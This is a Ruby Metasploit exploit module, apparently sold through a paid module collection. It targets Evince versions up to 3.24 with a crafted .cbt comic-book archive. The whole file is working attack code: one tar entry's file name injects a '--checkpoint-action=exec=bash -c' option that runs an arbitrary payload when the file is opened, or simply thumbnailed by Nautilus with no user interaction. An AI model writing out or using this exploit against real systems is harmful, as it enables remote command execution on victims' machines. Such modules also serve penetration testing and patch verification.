##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Evince .cbt Remote Command Execution ',
      'Description'    => %q{
    This module exploits a vulnerability in the Evince document reader in order to execute
    an arbitrary command.

    Versions of Evince up to 3.24 were vulnerable to a command execution vulnerability
    when opening specially crafted .cbt (comic book) files. This issue is exacerbated
    by the fact that Nautilus will immediately try to thumbnail the filetype, which
    can trigger the payload as well with no user interaction.

   Categories: Open Source

    Price: 4

    Video: https://asciinema.org/a/TdZ5dpGamhki3egX7SUPt2whZ

    OS: Linux

    Arch: Multi

    Requirements: Metasploit Framework

      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
        ],
      'References'     =>
        [
        ],
      'Platform'          => [ 'unix' ],
      'Arch' => ARCH_CMD,
      'Privileged' => 'false',
      'Payload'           =>
        {
          'Space'    => 256,
          'BadChars' => "\x00\x0a\x0d\"",
          'DisableNops' => true,
        },
      'Targets'        =>
        [
          [ 'Default', { } ],
        ],
      'DisclosureDate' => '',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ true, 'The output file name.', 'msf.cbt']),
        ])
  end

  def exploit

    tarfile = StringIO.new("")
    Gem::Package::TarWriter.new(tarfile) do |tar|
      awesome_stuff = "fdsafdsa"
      tar.add_file_simple("--checkpoint-action=exec=bash -c \"#{payload.encoded};\".jpg", 0444, awesome_stuff.length) do |io|
          io.write(awesome_stuff)
      end

      tar.add_file_simple("huge", 0444, 25*4096) do |io|
        io.write("0"*(25*4096))
      end
    end


    file_create(tarfile.string)
  end
end
